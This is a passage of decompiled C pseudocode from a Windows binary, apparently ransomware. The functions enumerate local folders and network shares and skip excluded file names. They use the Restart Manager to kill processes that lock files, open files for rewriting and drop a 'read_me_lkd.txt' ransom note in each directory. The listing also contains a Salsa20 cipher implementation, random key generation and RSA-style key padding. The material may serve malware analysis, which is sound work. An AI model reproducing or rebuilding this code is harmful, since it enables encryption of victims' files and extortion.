  _DWORD *v9; // ecx
  HANDLE ProcessHeap; // eax
  _DWORD *v11; // eax
  int v12; // eax
  int v13; // esi
  int v14; // edi
  int result; // eax
  int v16; // edx
  bool v17; // zf
  _DWORD *v18; // ecx
  void *v19; // [esp-8h] [ebp-1Ch]
  _DWORD *v20; // [esp+Ch] [ebp-8h]
  int v21; // [esp+10h] [ebp-4h]
  _DWORD *v22; // [esp+2Ch] [ebp+18h]

  v6 = v5;
  v21 = 256;
  v7 = (unsigned __int8 *)(a5 + 255);
  v20 = v5;
  v8 = *v5 < 64;
  v9 = (_DWORD *)v5[2];
  v22 = v9;
  if ( v8 )
  {
    v19 = v9;
    ProcessHeap = GetProcessHeap();
    v11 = HeapReAlloc(ProcessHeap, 8u, v19, 0x100u);
    *v6 = 64;
    v22 = v11;
    v12 = abs32(v6[1]);
    v6[2] = v22;
    if ( v12 > 64 )
      v6[1] = 0;
  }
  v13 = 0;
  v14 = 0;
  result = 0;
  do
  {
    v16 = *v7 << (8 * v14++);
    v13 |= v16;
    if ( v14 == 4 )
    {
      v22[result] = v13;
      v14 = 0;
      ++result;
      v13 = 0;
    }
    v17 = v21-- == 1;
    --v7;
  }
  while ( !v17 );
  if ( v13 )
  {
    v22[result++] = v13;
    v20[1] = result;
  }
  else
  {
    if ( result > 0 )
    {
      v18 = &v22[result - 1];
      do
      {
        if ( *v18 )
          break;
        --result;
        --v18;
      }
      while ( result > 0 );
    }
    v20[1] = result;
  }
  return result;
}
// 40455B: variable 'v5' is possibly undefined

//----- (00404630) --------------------------------------------------------
char *__cdecl sub_404630(int a1, int a2, int a3, int a4, int a5)
{
  char *v5; // ecx
  char *v6; // edi
  int v7; // eax
  unsigned int v8; // eax
  int v9; // ecx
  unsigned int v10; // ebx
  int v11; // esi
  HANDLE ProcessHeap; // eax
  int v13; // ecx
  char *v14; // edx
  signed int v15; // eax
  SIZE_T v17; // [esp-Ch] [ebp-18h]
  signed int v18; // [esp+4h] [ebp-8h]
  char *v19; // [esp+8h] [ebp-4h]

  v6 = v5;
  v19 = v5;
  v7 = *(_DWORD *)(a5 + 4);
  if ( !v7 )
    return v5;
  v8 = abs32(v7);
  v18 = v8;
  v9 = 0;
  v10 = *(_DWORD *)(*(_DWORD *)(a5 + 8) + 4 * v8 - 4);
  do
  {
    v10 >>= 8;
    ++v9;
  }
  while ( v10 );
  v11 = v9 + 4 * (v8 - 1);
  if ( !v6 )
  {
    v17 = v9 + 4 * (v8 - 1);
    ProcessHeap = GetProcessHeap();
    v6 = (char *)HeapAlloc(ProcessHeap, 8u, v17);
    v19 = v6;
  }
  v13 = 0;
  v14 = &v6[v11 - 1];
  v15 = 0;
  if ( !v11 )
    return v6;
  do
  {
    if ( !v13 )
    {
      if ( v15 < v18 )
        v10 = *(_DWORD *)(*(_DWORD *)(a5 + 8) + 4 * v15++);
      v13 = 4;
    }
    *v14 = v10;
    --v13;
    v10 >>= 8;
    --v14;
    --v11;
  }
  while ( v11 );
  return v19;
}
// 404637: variable 'v5' is possibly undefined

//----- (004046E0) --------------------------------------------------------
bool __thiscall sub_4046E0(void *this)
{
  int *ThreadLocalStoragePointer; // eax
  bool v2; // bl
  int v3; // esi
  WCHAR v5[34]; // [esp+8h] [ebp-58h] BYREF
  int v6; // [esp+4Ch] [ebp-14h] BYREF
  int v7; // [esp+50h] [ebp-10h] BYREF
  void *v8; // [esp+54h] [ebp-Ch] BYREF
  int v9; // [esp+58h] [ebp-8h] BYREF
  DWORD v10; // [esp+5Ch] [ebp-4h] BYREF

  ThreadLocalStoragePointer = (int *)NtCurrentTeb()->ThreadLocalStoragePointer;
  v2 = 0;
  v8 = this;
  v3 = *ThreadLocalStoragePointer;
  if ( dword_427438 > *(_DWORD *)(*ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_427438);
    if ( dword_427438 == -1 )
    {
      hModule = LoadLibraryW(L"Rstrtmgr.dll");
      _Init_thread_footer(&dword_427438);
    }
  }
  if ( !hModule )
    return 0;
  if ( dword_427460 > *(_DWORD *)(v3 + 4) )
  {
    _Init_thread_header(&dword_427460);
    if ( dword_427460 == -1 )
    {
      RmStartSession = (DWORD (__stdcall *)(DWORD *, DWORD, WCHAR[]))GetProcAddress(hModule, "RmStartSession");
      _Init_thread_footer(&dword_427460);
    }
  }
  if ( dword_427434 > *(_DWORD *)(v3 + 4) )
  {
    _Init_thread_header(&dword_427434);
    if ( dword_427434 == -1 )
    {
      RmRegisterResources = (DWORD (__stdcall *)(DWORD, UINT, LPCWSTR[], UINT, RM_UNIQUE_PROCESS[], UINT, LPCWSTR[]))GetProcAddress(hModule, "RmRegisterResources");
      _Init_thread_footer(&dword_427434);
    }
  }
  if ( dword_42744C > *(_DWORD *)(v3 + 4) )
  {
    _Init_thread_header(&dword_42744C);
    if ( dword_42744C == -1 )
    {
      RmGetList = (DWORD (__stdcall *)(DWORD, UINT *, UINT *, RM_PROCESS_INFO[], LPDWORD))GetProcAddress(
                                                                                            hModule,
                                                                                            "RmGetList");
      _Init_thread_footer(&dword_42744C);
    }
  }
  if ( dword_427444 > *(_DWORD *)(v3 + 4) )
  {
    _Init_thread_header(&dword_427444);
    if ( dword_427444 == -1 )
    {
      RmEndSession = (DWORD (__stdcall *)(DWORD))GetProcAddress(hModule, "RmEndSession");
      _Init_thread_footer(&dword_427444);
    }
  }
  if ( dword_42743C > *(_DWORD *)(v3 + 4) )
  {
    _Init_thread_header(&dword_42743C);
    if ( dword_42743C == -1 )
    {
      RmShutdown = (DWORD (__stdcall *)(DWORD, ULONG, RM_WRITE_STATUS_CALLBACK))GetProcAddress(hModule, "RmShutdown");
      _Init_thread_footer(&dword_42743C);
    }
  }
  if ( !RmStartSession || !RmRegisterResources || !RmGetList || !RmEndSession || !RmShutdown )
    return 0;
  v10 = 0;
  memset(v5, 0, 0x42u);
  if ( !RmStartSession(&v10, 0, v5) )
  {
    if ( !RmRegisterResources(v10, 1, (LPCWSTR *)&v8, 0, 0, 0, 0) )
    {
      v7 = 0;
      v9 = 0;
      v6 = 0;
      if ( RmGetList(v10, (UINT *)&v9, (UINT *)&v6, 0, (LPDWORD)&v7) == 234 )
      {
        if ( v9 )
          v2 = RmShutdown(v10, 1, 0) == 0;
      }
    }
    RmEndSession(v10);
  }
  return v2;
}
// 406228: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 406272: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 427434: using guessed type int dword_427434;
// 427438: using guessed type int dword_427438;
// 42743C: using guessed type int dword_42743C;
// 427444: using guessed type int dword_427444;
// 42744C: using guessed type int dword_42744C;
// 427460: using guessed type int dword_427460;
// 4046E0: using guessed type WCHAR var_58[34];

//----- (00404970) --------------------------------------------------------
DWORD __stdcall sub_404970(LPVOID lpThreadParameter)
{
  void *v1; // ebx
  HANDLE v2; // eax
  WCHAR *v3; // eax
  WCHAR *v4; // edi
  void (*v5)(PWSTR, int, PCWSTR, ...); // esi
  wchar_t **v6; // esi
  const WCHAR *v7; // eax
  DWORD FileAttributesW; // eax
  HANDLE FileW; // ebx
  WCHAR *v10; // esi
  HANDLE (__stdcall *v11)(); // esi
  HANDLE ProcessHeap; // eax
  void (__stdcall *v13)(HANDLE, DWORD, LPVOID); // edi
  HANDLE v14; // eax
  const WCHAR *v16; // [esp-4h] [ebp-264h]
  WCHAR *v17; // [esp-4h] [ebp-264h]
  HANDLE hFindFile; // [esp+Ch] [ebp-254h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-250h] BYREF

  v1 = lpThreadParameter;
  if ( lpThreadParameter && (v2 = GetProcessHeap(), v3 = (WCHAR *)HeapAlloc(v2, 8u, 0xFFFEu), (v4 = v3) != 0) )
  {
    v5 = (void (*)(PWSTR, int, PCWSTR, ...))wnsprintfW;
    wnsprintfW(v3, 0x7FFF, L"%s\\*", lpThreadParameter);
    hFindFile = FindFirstFileW(v4, &FindFileData);
    if ( hFindFile != (HANDLE)-1 )
    {
      do
      {
        v5(v4, 0x7FFF, L"%s\\%s", v1, FindFileData.cFileName);
        if ( (FindFileData.dwFileAttributes & 0x10) == 0 )
        {
          v6 = off_426780;
          while ( 1 )
          {
            v16 = *v6;
            v7 = CharLowerW(FindFileData.cFileName);
            if ( StrStrW(v7, v16) )
              break;
            if ( ++v6 == off_4267C4 )
            {
              FileAttributesW = GetFileAttributesW(v4);
              if ( (FileAttributesW & 1) != 0 )
                SetFileAttributesW(v4, FileAttributesW & 0xFFFFFFFE);
              FileW = CreateFileW(v4, 0xC0000000, 1u, 0, 3u, 0, 0);
              if ( FileW != (HANDLE)-1 )
                goto LABEL_14;
              while ( sub_4046E0(v4) )
                ;
              FileW = CreateFileW(v4, 0xC0000000, 1u, 0, 3u, 0, 0);
              if ( FileW == (HANDLE)-1 )
              {
                GetLastError();
              }
              else
              {
LABEL_14:
                InterlockedExchangeAdd(&dword_427424, 1);
                v10 = (WCHAR *)operator new(0x10004u);
                memset(v10, 0, 0x10004u);
                *(_DWORD *)v10 = FileW;
                lstrcpynW(v10 + 2, v4, 0x7FFF);
                QueueUserWorkItem((LPTHREAD_START_ROUTINE)Function, v10, 0);
              }
              v1 = lpThreadParameter;
              break;
            }
          }
          v5 = (void (*)(PWSTR, int, PCWSTR, ...))wnsprintfW;
        }
      }
      while ( FindNextFileW(hFindFile, &FindFileData) );
      FindClose(hFindFile);
    }
    v5(v4, 0x7FFF, L"%s\\read_me_lkd.txt", v1);
    v11 = GetProcessHeap;
    v17 = v4;
    ProcessHeap = GetProcessHeap();
    v13 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
    HeapFree(ProcessHeap, 0, v17);
  }
  else
  {
    v13 = (void (__stdcall *)(HANDLE, DWORD, LPVOID))HeapFree;
    v11 = GetProcessHeap;
  }
  InterlockedExchangeAdd(&dword_42742C, 1);
  v14 = v11();
  v13(v14, 0, v1);
  return 0;
}
// 426780: using guessed type wchar_t *off_426780[26];
// 4267C4: using guessed type wchar_t *off_4267C4[9];

//----- (00404B60) --------------------------------------------------------
void __stdcall sub_404B60(WCHAR *lpString2)
{
  const WCHAR *v1; // ebx
  HANDLE ProcessHeap; // eax
  WCHAR *v3; // esi
  HANDLE v4; // eax
  WCHAR *v5; // eax
  WCHAR *v6; // edi
  int (__stdcall *v7)(LPCWSTR, LPCWSTR); // esi
  char *v8; // esi
  const WCHAR *v9; // eax
  HANDLE FileW; // esi
  LPCVOID *v11; // ecx
  HANDLE v12; // eax
  const WCHAR *v13; // [esp-4h] [ebp-268h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-254h] BYREF

  v1 = lpString2;
  if ( lpString2 )
  {
    ProcessHeap = GetProcessHeap();
    v3 = (WCHAR *)HeapAlloc(ProcessHeap, 8u, 0xFFFEu);
    lstrcpyW(v3, v1);
    InterlockedExchangeAdd(&dword_427430, 1);
    QueueUserWorkItem(sub_404970, v3, 0);
    v4 = GetProcessHeap();
    v5 = (WCHAR *)HeapAlloc(v4, 8u, 0xFFFEu);
    v6 = v5;
    if ( v5 )
    {
      wnsprintfW(v5, 0x7FFF, L"%s\\*", v1);
      lpString2 = (WCHAR *)FindFirstFileW(v6, &FindFileData);
      if ( lpString2 != (WCHAR *)-1 )
      {
        v7 = lstrcmpW;
        do
        {
          wnsprintfW(v6, 0x7FFF, L"%s\\%s", v1, FindFileData.cFileName);
          if ( (FindFileData.dwFileAttributes & 0x10) != 0
            && v7(FindFileData.cFileName, L"..")
            && v7(FindFileData.cFileName, L".") )
          {
            v8 = (char *)off_4267C4;
            while ( 1 )
            {
              v13 = *(const WCHAR **)v8;
              v9 = CharLowerW(FindFileData.cFileName);
              if ( StrStrW(v9, v13) )
                break;
              v8 += 4;
              if ( v8 == &byte_4267E8 )
              {
                sub_404B60(v6);
                break;
              }
            }
            v7 = lstrcmpW;
          }
        }
        while ( FindNextFileW(lpString2, &FindFileData) );
        FindClose(lpString2);
      }
      wnsprintfW(v6, 0x7FFF, L"%s\\read_me_lkd.txt", v1);
      FileW = CreateFileW(v6, 0x40000000u, 0, 0, 1u, 0x80u, 0);
      if ( FileW != (HANDLE)-1 )
      {
        v11 = &lpBuffer;
        if ( HIDWORD(qword_4268F8) >= 8 )
          v11 = (LPCVOID *)lpBuffer;
        WriteFile(FileW, v11, 2 * qword_4268F8, (LPDWORD)&lpString2, 0);
        CloseHandle(FileW);
      }
      v12 = GetProcessHeap();
      HeapFree(v12, 0, v6);
    }
  }
}
// 4267C4: using guessed type wchar_t *off_4267C4[9];
// 4267E8: using guessed type char byte_4267E8;
// 4268F8: using guessed type __int64 qword_4268F8;

//----- (00404D30) --------------------------------------------------------
int __stdcall sub_404D30(LPNETRESOURCEW lpNetResource)
{
  int result; // eax
  HANDLE ProcessHeap; // eax
  WCHAR **v3; // eax
  WCHAR **v4; // ebx
  DWORD v5; // edi
  WCHAR **v6; // esi
  HANDLE v7; // eax
  SIZE_T v8; // [esp-4h] [ebp-20h]
  HANDLE hEnum; // [esp+10h] [ebp-Ch] BYREF
  SIZE_T dwBytes; // [esp+14h] [ebp-8h] BYREF
  DWORD cCount; // [esp+18h] [ebp-4h] BYREF

  cCount = -1;
  dwBytes = 0x4000;
  result = WNetOpenEnumW(2u, 0, 0x13u, lpNetResource, &hEnum);
  if ( !result )
  {
    v8 = dwBytes;
    ProcessHeap = GetProcessHeap();
    v3 = (WCHAR **)HeapAlloc(ProcessHeap, 8u, v8);
    v4 = v3;
    if ( v3 )
    {
      if ( !WNetEnumResourceW(hEnum, &cCount, v3, &dwBytes) )
      {
        do
        {
          v5 = 0;
          if ( cCount )
          {
            v6 = v4 + 5;
            do
            {
              if ( (*(_BYTE *)(v6 - 2) & 2) != 0 )
                sub_404D30((LPNETRESOURCEW)(v6 - 5));
              else
                sub_404B60(*v6);
              ++v5;
              v6 += 8;
            }
            while ( v5 < cCount );
          }
        }
        while ( !WNetEnumResourceW(hEnum, &cCount, v4, &dwBytes) );
      }
      v7 = GetProcessHeap();
      HeapFree(v7, 0, v4);
    }
    return WNetCloseEnum(hEnum);
  }
  return result;
}

//----- (00404E00) --------------------------------------------------------
LONG sub_404E00()
{
  LONG result; // eax

  for ( result = dword_427430; dword_42742C < dword_427430; result = dword_427430 )
    Sleep(0x1388u);
  return result;
}

//----- (00404E30) --------------------------------------------------------
int __fastcall sub_404E30(int a1, int a2, unsigned int a3)
{
  int v4; // edx
  int i; // edi
  int v6; // ecx
  int v7; // eax
  int v8; // ebx
  int v9; // esi
  int v10; // ecx
  int v11; // edx
  int v12; // edi
  int v13; // esi
  int v14; // ecx
  int v15; // eax
  int v16; // edx
  int v17; // ecx
  int v18; // eax
  bool v19; // zf
  int v20; // edi
  int result; // eax
  int v22; // esi
  int v23; // ebx
  int v24; // edx
  int v25; // ecx
  int v27; // [esp+10h] [ebp-90h]
  int v28; // [esp+14h] [ebp-8Ch]
  int v29; // [esp+18h] [ebp-88h]
  int v30; // [esp+1Ch] [ebp-84h]
  int v31; // [esp+20h] [ebp-80h]
  int v32; // [esp+24h] [ebp-7Ch]
  int v33; // [esp+28h] [ebp-78h]
  int v34; // [esp+2Ch] [ebp-74h]
  int v35; // [esp+30h] [ebp-70h]
  int v36; // [esp+34h] [ebp-6Ch]
  int v37; // [esp+38h] [ebp-68h]
  int v38; // [esp+3Ch] [ebp-64h]
  int v39; // [esp+40h] [ebp-60h]
  int v40; // [esp+44h] [ebp-5Ch]
  int v41; // [esp+48h] [ebp-58h]
  int v42; // [esp+4Ch] [ebp-54h]
  int v43; // [esp+50h] [ebp-50h]
  int v44; // [esp+54h] [ebp-4Ch]
  int v45; // [esp+58h] [ebp-48h]
  int v46; // [esp+5Ch] [ebp-44h]
  int v47; // [esp+60h] [ebp-40h]
  int v48; // [esp+64h] [ebp-3Ch]
  int v49; // [esp+68h] [ebp-38h]
  int v50; // [esp+6Ch] [ebp-34h]
  int v51; // [esp+70h] [ebp-30h]
  int v52; // [esp+74h] [ebp-2Ch]
  int v53; // [esp+78h] [ebp-28h]
  int v54; // [esp+7Ch] [ebp-24h]
  int v55; // [esp+80h] [ebp-20h]
  int v56; // [esp+84h] [ebp-1Ch]
  int v57; // [esp+88h] [ebp-18h]
  int v58; // [esp+8Ch] [ebp-14h]
  int v59; // [esp+90h] [ebp-10h]
  int v60; // [esp+94h] [ebp-Ch]
  int v61; // [esp+98h] [ebp-8h]
  int v62; // [esp+9Ch] [ebp-4h]
  unsigned int v63; // [esp+A8h] [ebp+8h]

  v4 = a1;
  v27 = a2;
  for ( i = 0; i < 16; ++i )
  {
    v6 = i;
    v7 = *(_DWORD *)(a2 + 4 * i);
    *(&v32 + v6) = v7;
  }
  v63 = a3 >> 1;
  if ( v63 )
  {
    v8 = v43;
    v9 = v33;
    v10 = v32;
    v11 = v44;
    v55 = v46;
    v62 = v45;
    v56 = v42;
    v57 = v41;
    v58 = v40;
    v49 = v39;
    v48 = v37;
    v59 = v36;
    v54 = v47;
    v12 = v38;
    v50 = v35;
    v60 = v43;
    v53 = v38;
    v51 = v34;
    v52 = v33;
    v61 = v32;
    do
    {
      v59 ^= __ROL4__(v10 + v11, 7);
      v31 = v58 ^ __ROL4__(v59 + v10, 9);
      v29 = v11 ^ __ROL4__(v31 + v59, 13);
      v61 ^= __ROR4__(v31 + v29, 14);
      v58 = v57 ^ __ROL4__(v9 + v48, 7);
      v28 = v62 ^ __ROL4__(v58 + v48, 9);
      v13 = v52 ^ __ROL4__(v28 + v58, 13);
      v57 = v48 ^ __ROR4__(v13 + v28, 14);
      v30 = v55 ^ __ROL4__(v12 + v56, 7);
      v14 = v51 ^ __ROL4__(v30 + v56, 9);
      v55 = v53 ^ __ROL4__(v30 + v14, 13);
      v56 ^= __ROR4__(v55 + v14, 14);
      v15 = v50 ^ __ROL4__(v8 + v54, 7);
      v16 = v49 ^ __ROL4__(v15 + v54, 9);
      v60 ^= __ROL4__(v16 + v15, 13);
      v62 = v54 ^ __ROR4__(v60 + v16, 14);
      v52 = v13 ^ __ROL4__(v15 + v61, 7);
      v33 = v52;
      v51 = v14 ^ __ROL4__(v61 + v52, 9);
      v34 = v51;
      v50 = v15 ^ __ROL4__(v51 + v52, 13);
      v35 = v50;
      v61 ^= __ROR4__(v51 + v50, 14);
      v32 = v61;
      v53 = v55 ^ __ROL4__(v57 + v59, 7);
      v38 = v53;
      v12 = v53;
      v49 = v16 ^ __ROL4__(v57 + v53, 9);
      v39 = v49;
      v59 ^= __ROL4__(v49 + v53, 13);
      v36 = v59;
      v48 = v57 ^ __ROR4__(v59 + v49, 14);
      v37 = v48;
      v17 = v58;
      v60 ^= __ROL4__(v56 + v58, 7);
      v43 = v60;
      v58 = v31 ^ __ROL4__(v60 + v56, 9);
      v40 = v58;
      v57 = v17 ^ __ROL4__(v58 + v60, 13);
      v41 = v57;
      v18 = v62;
      v56 ^= __ROR4__(v57 + v58, 14);
      v42 = v56;
      v11 = v29 ^ __ROL4__(v62 + v30, 7);
      v62 = v28 ^ __ROL4__(v11 + v62, 9);
      v45 = v62;
      v55 = v30 ^ __ROL4__(v11 + v62, 13);
      v46 = v55;
      v8 = v60;
      v9 = v52;
      v19 = v63-- == 1;
      v54 = v18 ^ __ROR4__(v62 + v55, 14);
      v47 = v54;
      v10 = v61;
    }
    while ( !v19 );
    a2 = v27;
    v44 = v11;
    v4 = a1;
  }
  v20 = a2 + 12;
  result = 2;
  v22 = v4 + 4;
  v23 = a2 - v4;
  do
  {
    v22 += 16;
    v20 += 16;
    *(_DWORD *)(v22 - 20) = *(_DWORD *)(v20 - 28) + *(&v32 + result - 2);
    *(_DWORD *)(v22 - 16) = *(_DWORD *)(v23 + v22 - 16) + *(&v32 + result - 1);
    v24 = result + 1;
    v25 = *(_DWORD *)(v20 - 20) + *(&v32 + result);
    result += 4;
    *(_DWORD *)(v22 - 12) = v25;
    *(_DWORD *)(v22 - 8) = *(_DWORD *)(v20 - 16) + *(&v32 + v24);
  }
  while ( result - 2 < 16 );
  return result;
}

//----- (00405140) --------------------------------------------------------
int __fastcall sub_405140(int a1, unsigned __int8 *a2, int a3, int a4, int a5, int a6, unsigned int a7)
{
  int v8; // ecx
  int v9; // eax
  int v10; // ecx
  int v11; // eax
  int v12; // ecx
  int v13; // eax
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  int v17; // ecx
  int v18; // eax
  int v19; // ecx
  int v20; // eax
  int result; // eax
  int v22[16]; // [esp+8h] [ebp-80h] BYREF
  int v23[16]; // [esp+48h] [ebp-40h] BYREF

  v8 = *((unsigned __int16 *)a2 + 1);
  v23[0] = salsa20_426900 | ((byte_426901 | ((byte_426902 | (byte_426903 << 8)) << 8)) << 8);
  v9 = a2[6];
  v23[1] = *a2 | ((a2[1] | (v8 << 8)) << 8);
  v10 = a2[4] | ((a2[5] | ((v9 | (a2[7] << 8)) << 8)) << 8);
  v11 = a2[10];
  v23[2] = v10;
  v12 = a2[8] | ((a2[9] | ((v11 | (a2[11] << 8)) << 8)) << 8);
  v13 = a2[14];
  v23[3] = v12;
  v23[4] = a2[12] | ((a2[13] | ((v13 | (a2[15] << 8)) << 8)) << 8);
  v23[6] = a3;
  v23[7] = a4;
  v23[5] = byte_426904 | ((byte_426905 | ((byte_426906 | (byte_426907 << 8)) << 8)) << 8);
  v23[8] = a5;
  v23[9] = a6;
  v14 = a2[18];
  v23[10] = byte_426908 | ((byte_426909 | ((byte_42690A | (byte_42690B << 8)) << 8)) << 8);
  v15 = a2[16] | ((a2[17] | ((v14 | (a2[19] << 8)) << 8)) << 8);
  v16 = a2[22];
  v23[11] = v15;
  v17 = a2[20] | ((a2[21] | ((v16 | (a2[23] << 8)) << 8)) << 8);
  v18 = a2[26];
  v23[12] = v17;
  v19 = a2[24] | ((a2[25] | ((v18 | (a2[27] << 8)) << 8)) << 8);
  v20 = a2[30];
  v23[13] = v19;
  v23[14] = a2[28] | ((a2[29] | ((v20 | (a2[31] << 8)) << 8)) << 8);
  v23[15] = byte_42690C | ((byte_42690D | ((byte_42690E | (byte_42690F << 8)) << 8)) << 8);
  sub_404E30((int)v22, (int)v23, a7);
  for ( result = 0; result < 64; ++result )
    *(_BYTE *)(result + a1) = (unsigned int)v22[(unsigned int)result >> 2] >> (8 * (result & 3));
  return result;
}
// 426900: using guessed type char salsa20_426900;
// 426901: using guessed type char byte_426901;
// 426902: using guessed type char byte_426902;
// 426903: using guessed type char byte_426903;
// 426904: using guessed type char byte_426904;
// 426905: using guessed type char byte_426905;
// 426906: using guessed type char byte_426906;
// 426907: using guessed type char byte_426907;
// 426908: using guessed type char byte_426908;
// 426909: using guessed type char byte_426909;
// 42690A: using guessed type char byte_42690A;
// 42690B: using guessed type char byte_42690B;
// 42690C: using guessed type char byte_42690C;
// 42690D: using guessed type char byte_42690D;
// 42690E: using guessed type char byte_42690E;
// 42690F: using guessed type char byte_42690F;
// 405140: using guessed type int var_80[16];

//----- (00405370) --------------------------------------------------------
char __fastcall sub_405370(int a1, unsigned __int8 *a2, int a3, int a4, int a5, int a6, unsigned int a7)
{
  signed int i; // esi
  char result; // al
  char v10[68]; // [esp+10h] [ebp-4Ch] BYREF
  unsigned __int8 *v11; // [esp+54h] [ebp-8h]

  v11 = a2;
  for ( i = 0; (unsigned int)i < 0x20; ++i )
  {
    if ( (i & 0x8000003F) == 0 )
      sub_405140((int)v10, v11, a5, a6, i / 64, (i / 64) >> 31, a7);
    result = v10[i];
    *(_BYTE *)(i + a1) ^= result;
  }
  return result;
}
// 405388: conditional instruction was optimized away because esi.4<20u
// 405382: mask 0x8000003F is shortened because esi.4 <= 0x1F
// 405382: masking with 0x1F was optimized away because esi.4 <= 0x1F
// 405370: using guessed type char var_4C[68];

//----- (004053D0) --------------------------------------------------------
char __stdcall sub_4053D0(int a1, int a2)
{
  unsigned __int64 v2; // rax
  unsigned __int64 v3; // rax
  unsigned __int64 v4; // rax
  int CurrentProcessId; // eax
  int v6; // ebx
  int v7; // ecx
  unsigned __int64 v8; // rax
  unsigned __int8 v10[32]; // [esp+4h] [ebp-58h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+24h] [ebp-38h] BYREF
  LARGE_INTEGER PerformanceCount; // [esp+34h] [ebp-28h] BYREF
  struct _FILETIME SystemTimeAsFileTime; // [esp+40h] [ebp-1Ch] BYREF
  struct _FILETIME FileTime; // [esp+48h] [ebp-14h] BYREF
  int v15; // [esp+50h] [ebp-Ch]
  int v16; // [esp+54h] [ebp-8h]
  int v17; // [esp+58h] [ebp-4h]

  v2 = __rdtsc();
  v16 = v2;
  v3 = __rdtsc();
  v15 = v3;
  v4 = __rdtsc();
  FileTime.dwHighDateTime = v4;
  CurrentProcessId = GetCurrentProcessId();
  v17 = CurrentProcessId;
  if ( CurrentProcessId )
  {
    CurrentProcessId = GetCurrentThreadId();
    v6 = CurrentProcessId;
    if ( CurrentProcessId )
    {
      CurrentProcessId = GetTickCount();
      if ( CurrentProcessId )
      {
        GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
        CurrentProcessId = QueryPerformanceCounter(&PerformanceCount);
        if ( CurrentProcessId )
        {
          v10[0] = HIBYTE(v17);
          v10[1] = BYTE2(v17);
          v10[2] = BYTE1(v17);
          v10[4] = HIBYTE(v6);
          v10[5] = BYTE2(v6);
          v10[6] = BYTE1(v6);
          v10[3] = v17;
          v10[8] = HIBYTE(SystemTimeAsFileTime.dwLowDateTime);
          v10[9] = BYTE2(SystemTimeAsFileTime.dwLowDateTime);
          v10[10] = BYTE1(SystemTimeAsFileTime.dwLowDateTime);
          v10[11] = SystemTimeAsFileTime.dwLowDateTime;
          v10[12] = HIBYTE(SystemTimeAsFileTime.dwHighDateTime);
          v10[13] = BYTE2(SystemTimeAsFileTime.dwHighDateTime);
          v10[14] = BYTE1(SystemTimeAsFileTime.dwHighDateTime);
          v10[15] = SystemTimeAsFileTime.dwHighDateTime;
          v10[7] = v6;
          v10[19] = PerformanceCount.LowPart;
          v10[16] = BYTE3(PerformanceCount.QuadPart);
          v10[17] = BYTE2(PerformanceCount.u.LowPart);
          v10[23] = v16;
          v10[18] = BYTE1(PerformanceCount.LowPart);
          v10[20] = HIBYTE(v16);
          v10[21] = BYTE2(v16);
          v10[22] = BYTE1(v16);
          v10[24] = HIBYTE(v15);
          v10[25] = BYTE2(v15);
          v10[26] = BYTE1(v15);
          v10[27] = v15;
          v10[28] = HIBYTE(FileTime.dwHighDateTime);
          v10[29] = BYTE2(FileTime.dwHighDateTime);
          v10[31] = FileTime.dwHighDateTime;
          v7 = 0;
          v10[30] = BYTE1(FileTime.dwHighDateTime);
          do
          {
            v8 = __rdtsc();
            *(_BYTE *)(v7 + a1) = v8 + (unsigned int)v8 / 0xFF;
            ++v7;
          }
          while ( v7 != 32 );
          GetSystemTime(&SystemTime);
          SystemTimeToFileTime(&SystemTime, &FileTime);
          sub_405370(
            (int)v10,
            v10,
            FileTime.dwLowDateTime,
            FileTime.dwHighDateTime,
            *(__int64 *)&FileTime / 10000,
            (unsigned __int64)(*(__int64 *)&FileTime / 10000) >> 32,
            4u);
          GetSystemTime(&SystemTime);
          SystemTimeToFileTime(&SystemTime, &FileTime);
          LOBYTE(CurrentProcessId) = sub_405370(
                                       a1,
                                       v10,
                                       FileTime.dwLowDateTime,
                                       FileTime.dwHighDateTime,
                                       *(__int64 *)&FileTime / 10000,
                                       (unsigned __int64)(*(__int64 *)&FileTime / 10000) >> 32,
                                       0xCu);
        }
      }
    }
  }
  return CurrentProcessId;
}

//----- (004055E0) --------------------------------------------------------
int __stdcall sub_4055E0(int a1, int a2, int a3, __int128 a4, __int64 a5)
{
  int v5; // ebx
  HANDLE ProcessHeap; // eax
  HANDLE v7; // eax
  size_t v8; // eax
  int v9; // esi
  int v10; // edi
  int v11; // edi
  int v12; // edx
  bool v13; // zf
  int v14; // ecx
  int i; // eax
  bool v16; // sf
  int v17; // edi
  int v19; // [esp-14h] [ebp-168h]
  int v20; // [esp-14h] [ebp-168h]
  int v21; // [esp-10h] [ebp-164h]
  int v22; // [esp-10h] [ebp-164h]
  int v23; // [esp-Ch] [ebp-160h]
  int v24; // [esp-Ch] [ebp-160h]
  int v25; // [esp-8h] [ebp-15Ch]
  int v26; // [esp-8h] [ebp-15Ch]
  __int16 v27[130]; // [esp+10h] [ebp-144h] BYREF
  __int128 v28; // [esp+114h] [ebp-40h] BYREF
  __int64 v29; // [esp+124h] [ebp-30h]
  int v30[3]; // [esp+12Ch] [ebp-28h] BYREF
  int v31; // [esp+138h] [ebp-1Ch] BYREF
  int v32; // [esp+13Ch] [ebp-18h]
  _DWORD *v33; // [esp+140h] [ebp-14h]
  int v34; // [esp+144h] [ebp-10h]
  size_t v35; // [esp+148h] [ebp-Ch]
  int v36; // [esp+14Ch] [ebp-8h]

  v5 = 92;
  v36 = 0;
  v34 = 92;
  v30[0] = 1;
  v30[1] = 0;
  ProcessHeap = GetProcessHeap();
  v30[2] = (int)HeapAlloc(ProcessHeap, 8u, 4u);
  v31 = 1;
  v32 = 0;
  v7 = GetProcessHeap();
  v33 = HeapAlloc(v7, 8u, 4u);
  do
  {
    v27[0] = 512;
    v8 = v5;
    if ( v5 >= 245 )
      v8 = 245;
    v9 = 2;
    v10 = 255 - v8;
    v35 = v8;
    if ( (int)(255 - v8) > 2 )
    {
      do
        *((_BYTE *)v27 + v9++) = rand() % 254 + 1;
      while ( v9 < v10 );
      v5 = v34;
      v8 = v35;
    }
    *((_BYTE *)v27 + v9) = 0;
    memmove_0((char *)v27 + v9 + 1, (const void *)(a2 - v5 + 92), v8);
    sub_404550(v19, v21, v23, v25, (int)v27);
    v28 = a4;
    v29 = a5;
    sub_4040B0(&v31, v30, (int)&v28 + 12, (int)&v28);
